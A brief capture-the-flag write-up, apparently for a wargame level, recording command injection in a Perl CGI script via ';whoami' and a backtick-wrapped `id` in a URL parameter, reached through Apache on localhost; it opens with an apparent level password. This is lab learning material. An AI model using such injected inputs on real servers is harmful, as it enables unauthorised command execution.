level04:qi0maab88jeaj46qoumi7maus

we can run commands through the perl script
`./level04.pl x=hello;whoami` but only as level04

`ps aux` -> apache is running
`cat /etc/apache2/ports.conf` -> get port configured for it
`curl localhost:4747/level04.pl?x=`id`` -> try to curl it
IT WORKS